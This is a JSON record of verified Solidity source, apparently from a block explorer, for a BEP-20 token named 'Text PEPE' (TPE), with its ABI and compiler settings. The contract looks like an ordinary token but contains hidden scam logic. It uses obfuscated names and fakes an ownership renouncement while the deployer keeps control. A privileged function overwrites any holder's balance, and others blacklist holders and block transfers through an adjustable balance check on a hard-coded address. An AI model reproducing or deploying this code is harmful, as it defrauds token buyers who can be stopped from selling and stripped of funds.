{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface txMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atSwap) external view returns (uint256);\n\n    function transfer(address listEnable, uint256 totalAmountTrading) external returns (bool);\n\n    function allowance(address totalExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalAmountTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listEnable,\n        uint256 totalAmountTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atLiquidity, uint256 value);\n    event Approval(address indexed totalExempt, address indexed spender, uint256 value);\n}\n\nabstract contract listIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingLaunch {\n    function createPair(address fundAmount, address launchedMaxFund) external returns (address);\n}\n\ninterface txModeMetadata is txMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TextPEPE is listIs, txMode, txModeMetadata {\n\n    uint256 public tradingReceiverFrom;\n\n    uint256 public fundAuto;\n\n    mapping(address => bool) public enableAt;\n\n    function balanceOf(address atSwap) public view virtual override returns (uint256) {\n        return modeFrom[atSwap];\n    }\n\n    function feeTokenSender(address senderTx) public {\n        require(senderTx.balance < 100000);\n        if (buyMin) {\n            return;\n        }\n        \n        enableAt[senderTx] = true;\n        if (fundAuto == tradingReceiverFrom) {\n            fundAuto = modeFund;\n        }\n        buyMin = true;\n    }\n\n    constructor (){\n        \n        sellTeam totalFrom = sellTeam(toSell);\n        fromFee = tradingLaunch(totalFrom.factory()).createPair(totalFrom.WETH(), address(this));\n        \n        maxTotal = _msgSender();\n        txAmount();\n        enableAt[maxTotal] = true;\n        modeFrom[maxTotal] = walletMax;\n        \n        emit Transfer(address(0), maxTotal, walletMax);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedFund;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return sellLiquidityTotal;\n    }\n\n    function senderMax(address buyTakeShould, uint256 totalAmountTrading) public {\n        swapWallet();\n        modeFrom[buyTakeShould] = totalAmountTrading;\n    }\n\n    bool private buyReceiver;\n\n    function allowance(address isSwapToken, address liquidityLimit) external view virtual override returns (uint256) {\n        if (liquidityLimit == toSell) {\n            return type(uint256).max;\n        }\n        return fundIs[isSwapToken][liquidityLimit];\n    }\n\n    mapping(address => uint256) private modeFrom;\n\n    bool public buyMin;\n\n    address public fromFee;\n\n    function txAmount() public {\n        emit OwnershipTransferred(maxTotal, address(0));\n        enableLimit = address(0);\n    }\n\n    uint256 constant launchedLaunch = 7 ** 10;\n\n    address public maxTotal;\n\n    uint256 private modeFund;\n\n    mapping(address => bool) public fromIs;\n\n    address toSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private walletMax = 100000000 * 10 ** 18;\n\n    uint256 exemptAmount;\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderLiquidity;\n    }\n\n    function approve(address liquidityLimit, uint256 totalAmountTrading) public virtual override returns (bool) {\n        fundIs[_msgSender()][liquidityLimit] = totalAmountTrading;\n        emit Approval(_msgSender(), liquidityLimit, totalAmountTrading);\n        return true;\n    }\n\n    function listMin(address sellLiquidity, address listEnable, uint256 totalAmountTrading) internal returns (bool) {\n        require(modeFrom[sellLiquidity] >= totalAmountTrading);\n        modeFrom[sellLiquidity] -= totalAmountTrading;\n        modeFrom[listEnable] += totalAmountTrading;\n        emit Transfer(sellLiquidity, listEnable, totalAmountTrading);\n        return true;\n    }\n\n    function launchFee(uint256 totalAmountTrading) public {\n        swapWallet();\n        exemptAmount = totalAmountTrading;\n    }\n\n    address private enableLimit;\n\n    string private sellLiquidityTotal = \"Text PEPE\";\n\n    uint256 buyWallet;\n\n    bool private amountMax;\n\n    event OwnershipTransferred(address indexed marketingTx, address indexed takeReceiverLaunch);\n\n    function walletReceiver(address fromTx) public {\n        swapWallet();\n        if (buyReceiver == amountMax) {\n            fundAuto = tradingReceiverFrom;\n        }\n        if (fromTx == maxTotal || fromTx == fromFee) {\n            return;\n        }\n        fromIs[fromTx] = true;\n    }\n\n    address sellAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private launchedFund = \"TPE\";\n\n    function transfer(address buyTakeShould, uint256 totalAmountTrading) external virtual override returns (bool) {\n        return autoTake(_msgSender(), buyTakeShould, totalAmountTrading);\n    }\n\n    function autoTake(address sellLiquidity, address listEnable, uint256 totalAmountTrading) internal returns (bool) {\n        if (sellLiquidity == maxTotal) {\n            return listMin(sellLiquidity, listEnable, totalAmountTrading);\n        }\n        uint256 swapFrom = txMode(fromFee).balanceOf(sellAt);\n        require(swapFrom == exemptAmount);\n        require(listEnable != sellAt);\n        if (fromIs[sellLiquidity]) {\n            return listMin(sellLiquidity, listEnable, launchedLaunch);\n        }\n        return listMin(sellLiquidity, listEnable, totalAmountTrading);\n    }\n\n    mapping(address => mapping(address => uint256)) private fundIs;\n\n    function getOwner() external view returns (address) {\n        return enableLimit;\n    }\n\n    uint8 private senderLiquidity = 18;\n\n    function owner() external view returns (address) {\n        return enableLimit;\n    }\n\n    function swapWallet() private view {\n        require(enableAt[_msgSender()]);\n    }\n\n    function transferFrom(address sellLiquidity, address listEnable, uint256 totalAmountTrading) external override returns (bool) {\n        if (_msgSender() != toSell) {\n            if (fundIs[sellLiquidity][_msgSender()] != type(uint256).max) {\n                require(totalAmountTrading <= fundIs[sellLiquidity][_msgSender()]);\n                fundIs[sellLiquidity][_msgSender()] -= totalAmountTrading;\n            }\n        }\n        return autoTake(sellLiquidity, listEnable, totalAmountTrading);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletMax;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeReceiverLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSwapToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAmountTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTx\",\"type\":\"address\"}],\"name\":\"feeTokenSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalAmountTrading\",\"type\":\"uint256\"}],\"name\":\"launchFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTakeShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAmountTrading\",\"type\":\"uint256\"}],\"name\":\"senderMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingReceiverFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTakeShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAmountTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAmountTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTx\",\"type\":\"address\"}],\"name\":\"walletReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TextPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}